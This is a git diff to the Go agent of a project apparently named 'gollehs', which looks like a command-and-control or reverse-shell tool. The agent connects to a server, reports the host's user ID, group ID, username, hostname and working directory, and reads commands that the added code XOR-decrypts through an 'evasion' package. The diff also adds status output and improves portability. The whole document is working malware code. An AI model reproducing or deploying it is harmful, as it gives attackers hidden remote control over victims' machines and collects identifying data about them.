@@ -2,16 +2,20 @@ package main
 
 import (
 	"encoding/gob"
+	"errors"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/user"
 	"time"
 
 	"github.com/fatih/color"
+	"github.com/s-christian/gollehs/lib/evasion"
 	"github.com/s-christian/gollehs/lib/logger"
 	"github.com/s-christian/gollehs/lib/utils"
 	"github.com/s-christian/gollehs/types"
+	//"github.com/google/uuid"
 )
 
 const (
@@ -24,38 +28,40 @@ var (
 	serverIp, _  = net.ResolveIPAddr("ip4", "127.0.0.1")
 	serverTcp, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%s", serverIp.IP.String(), serverPort))
 
-	statusError   = color.New(color.BgRed, color.FgBlack, color.BlinkRapid)
-	statusWarning = color.New(color.BgYellow, color.FgBlack, color.Bold)
-	statusDone    = color.New(color.BgGreen, color.FgHiWhite, color.Italic)
+	statusError   = color.New(color.BgRed, color.FgWhite, color.Bold, color.BlinkSlow)
+	statusWarning = color.New(color.BgYellow, color.Bold)
+	statusInfo    = color.New(color.FgCyan, color.Italic)
+	statusProcess = color.New(color.FgBlue)
+	statusDone    = color.New(color.FgGreen, color.Bold)
 )
 
 func main() {
-	logger.Logf(logger.Info, "Agent connecting to %s\n", serverTcp.String())
+	statusInfo.Printf("Agent connecting to %s\n", serverTcp.String())
 
 	conn, err := net.DialTCP("tcp", nil, serverTcp)
 	if err != nil {
-		logger.Log(logger.Error, "Could not connect to server!")
-		logger.LogError(err)
+		statusError.Printf("Couldn't connect to server! - %s\n", err.Error())
 		return
 	}
 
 	defer func() {
 		utils.Close(conn)
-		statusWarning.Printf("Connection from %s closed\n", conn.RemoteAddr().String())
+		statusWarning.Printf("Connection to %s closed\n", conn.RemoteAddr().String())
 	}()
 
-	logger.Log(logger.Info, "Connection established, sending environment information to server")
+	statusProcess.Println("Connection established, sending environment information to server")
 
 	// Populate AgentCallback struct with system and user data
 	agentCallback := &types.AgentCallback{
-		UID:      "<unknown>",
-		GIDs:     []string{},
-		Username: "<unknown>",
-		Name:     "<unknown>",
-		Hostname: "<unknown>",
-		Cwd:      "<?>",
-		Output:   "",
-		ExitCode: ExitSuccess,
+		UID:             "-1",
+		GID:             "-1",
+		Username:        "<user>",
+		Name:            "<name>",
+		Hostname:        "<hostname>",
+		Cwd:             "<cwd>",
+		Output:          "",
+		ExitCode:        ExitSuccess,
+		LastInteraction: time.Now().Format(time.RFC3339),
 	}
 
 	currentUser, err := user.Current()
@@ -64,6 +70,8 @@ func main() {
 		logger.LogError(err)
 	} else {
 		agentCallback.UID = currentUser.Uid
+		agentCallback.GID = currentUser.Gid
+		/* --- GroupIds() requires cgo, requiring dynamic linking to GLIBC. Not as portable.
 		groupIDs, err := currentUser.GroupIds()
 		if err != nil {
 			logger.Log(logger.Error, "Cannot retrieve groups IDs")
@@ -71,6 +79,7 @@ func main() {
 		} else {
 			agentCallback.GIDs = groupIDs
 		}
+		*/
 		agentCallback.Username = currentUser.Username
 		agentCallback.Name = currentUser.Name
 	}
@@ -106,12 +115,16 @@ func main() {
 
 		numBytes, err := conn.Read(dataBuffer)
 		if err != nil {
-			statusError.Printf("No data read from %s, closing\n", conn.RemoteAddr().String())
-			logger.LogError(err)
+			if !errors.Is(err, io.EOF) {
+				statusError.Printf("No data read from %s, closing\n", conn.RemoteAddr().String())
+				logger.LogError(err)
+			}
 			return
 		}
 
-		logger.Logf(logger.Debug, "Command is: '%s'\n", string(dataBuffer))
+		decryptedCommand := evasion.XorEncryptDecryptBytes(dataBuffer[:numBytes])
+
+		logger.Logf(logger.Debug, "Command is: '%s'\n", string(decryptedCommand))
 
 		// Shouldn't ever technically be greater than, but adding just in case
 		if numBytes >= len(dataBuffer) {
